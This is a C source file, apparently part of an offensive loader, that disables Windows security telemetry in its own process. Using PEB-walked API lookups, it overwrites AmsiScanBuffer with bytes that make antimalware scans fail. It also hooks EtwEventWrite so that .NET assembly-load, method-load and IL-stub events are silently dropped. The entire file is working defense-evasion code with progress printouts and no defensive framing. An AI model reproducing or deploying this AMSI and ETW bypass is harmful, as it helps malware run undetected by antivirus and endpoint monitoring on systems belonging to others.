#include "Util.h"
#include "PEB.h"

#ifdef WIN_X64
unsigned char _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
#ifdef WIN_X86
unsigned char _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
#endif

#define ModuleLoad_V2 152
#define AssemblyDCStart_V1 155
#define MethodLoadVerbose_V1 143
#define MethodJittingStarted 145
#define ILStubGenerated 88

UCHAR _etwHook[] = {
	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0
};


void patchAmci() {

	_PFNWriteProcessMemory WriteProcessMemory;
	_PFNAmsiScanBuffer AmsiScanBuffer;
	_PFNVirtualProtectEx VirtualProtectEx;
	_PFNGetCurrentProcess GetCurrentProcess;
	_PFNGetCurrentProcessId GetCurrentProcessId;

	ADDR kernel32_base = findModuleBase(_kernel32dll);
	ADDR amsi_base = findModuleBase(_amsidll);

		GetCurrentProcess = (_PFNGetCurrentProcess)findExportAddr(kernel32_base, _GetCurrentProcess);
	GetCurrentProcessId = (_PFNGetCurrentProcessId)findExportAddr(kernel32_base, _GetCurrentProcessId);
	printf("[+]: Start Patching AMSI...\n");
	fflush(stdout);
	printf("[+]: AMSI.DLL Module Base Address: 0x%x\n", amsi_base);
	fflush(stdout);

	if (amsi_base != NULL) {
		AmsiScanBuffer = (_PFNAmsiScanBuffer)findExportAddr(amsi_base, _AmsiScanBuffer);
		printf("[+]: AmsiScanBuffer Export located at Address: 0x%x\n", AmsiScanBuffer);
		fflush(stdout);
		WriteProcessMemory = (_PFNWriteProcessMemory)findExportAddr(kernel32_base, _WriteProcessMemory);

		ULONG OldProtection, NewProtection;
		LPVOID lpBaseAddress = AmsiScanBuffer;
		UCHAR *patch = _patchBytes;
		SIZE_T uSize = sizeof(_patchBytes);
		BOOL status;
		VirtualProtectEx = (_PFNVirtualProtectEx)findExportAddr(kernel32_base, _VirtualProtectEx);
		status = VirtualProtectEx(GetCurrentProcess(), lpBaseAddress, uSize, PAGE_READWRITE, &OldProtection);
		if (status != 1) {
			printf("[!]: Error VirtualProtect First\n");
			fflush(stdout);
		}
		printf("[+]: Patching AmsiScanBuffer 0x%x\n", lpBaseAddress);
		fflush(stdout);

		status = WriteProcessMemory(GetCurrentProcess(), lpBaseAddress, patch, uSize, NULL);

		if (status != 1) {
			printf("[!]: Error WriteProcessMemory\n");
			fflush(stdout);
		}

		status = VirtualProtectEx(GetCurrentProcess(), lpBaseAddress, uSize, OldProtection, &NewProtection);
		if (status != 1) {
			printf("[!]: Error VirtualProtect Second\n");
			fflush(stdout);
		}

		printf("[+]: AMSI Patching Done.\n");
		_separator();
		fflush(stdout);
	}

}

ULONG NTAPI MyEtwEventWrite(__in REGHANDLE RegHandle, __in PCEVENT_DESCRIPTOR EventDescriptor, __in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData) {

	_PFNEtwEventWriteFull EtwEventWriteFull;
	ADDR ntdll_base = findModuleBase(_ntdlldll);
	EtwEventWriteFull = (_PFNEtwEventWriteFull)findExportAddr(ntdll_base, _EtwEventWriteFull);

	ULONG uResult = 0;

	if (EtwEventWriteFull == NULL) {
		printf("\t\t[!]: Error EtwEventWriteFull \n");
		return 1;
	}

	switch (EventDescriptor->Id) {
	case AssemblyDCStart_V1:
		break;
	case MethodLoadVerbose_V1:
		break;
	case ILStubGenerated:
		break;
	default:
		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
	}

	return uResult;
}

void patchEtw() {

	_PFNVirtualProtectEx VirtualProtectEx;
	_PFNWriteProcessMemory WriteProcessMemory;
	_PFNGetCurrentProcess GetCurrentProcess;
	_PFNGetCurrentProcessId GetCurrentProcessId;

	printf("[+]: Patching ETW...\n");
	fflush(stdout);

	BOOL status;
	ADDR kernel32_base = findModuleBase(_kernel32dll);
	VirtualProtectEx = (_PFNVirtualProtectEx)findExportAddr(kernel32_base, _VirtualProtectEx);
	GetCurrentProcess = (_PFNGetCurrentProcess)findExportAddr(kernel32_base, _GetCurrentProcess);
	GetCurrentProcessId = (_PFNGetCurrentProcessId)findExportAddr(kernel32_base, _GetCurrentProcessId);

	printf("[+]: Retrieving EtwEvenWrite Address from NTDLL...\n");
	fflush(stdout);

	DWORD newProtection, oldProtection;
	ADDR ntdll_base = findModuleBase(_ntdlldll);

	printf("[+]: NTDLL.DLL Module Base Address: 0x%x\n", ntdll_base);
	fflush(stdout);
	// Get the EtwEventWrite function
	LPVOID eventWriteAddr = (LPVOID)findExportAddr(ntdll_base, _EtwEventWrite);
	printf("[+]: EtwEvenWrite Export located at Address: 0x%x\n", eventWriteAddr);
	fflush(stdout);

	// Change page permissions.
	status = VirtualProtectEx(GetCurrentProcess(), eventWriteAddr, sizeof(_etwHook), PAGE_EXECUTE_READWRITE, &oldProtection);
	if (status != 1) {
		printf("[!]: Error VirtualProtectEx \n");
		fflush(stdout);
	}
	printf("[+]: Patching EtwEvenWrite 0x%x\n", eventWriteAddr);
	fflush(stdout);

	// Add address of hook function to patch.
	*(DWORD64*)&_etwHook[2] = (DWORD64)MyEtwEventWrite;

	// Patching ETW
	WriteProcessMemory = (_PFNWriteProcessMemory)findExportAddr(kernel32_base, _WriteProcessMemory);
	status = WriteProcessMemory(GetCurrentProcess(), eventWriteAddr, _etwHook, sizeof(_etwHook), NULL);
	if (status != 1) {
		printf("[!]: Error WriteProcessMemory\n");
		fflush(stdout);
	}

	status = VirtualProtectEx(GetCurrentProcess(), eventWriteAddr, sizeof(_etwHook), oldProtection, &newProtection);
	if (status != 1) {
		printf("[!]: Error VirtualProtectEx First\n");
		fflush(stdout);
	}

	printf("[+]: ETW Patchine Done.\n");
	_separator();
	fflush(stdout);

}
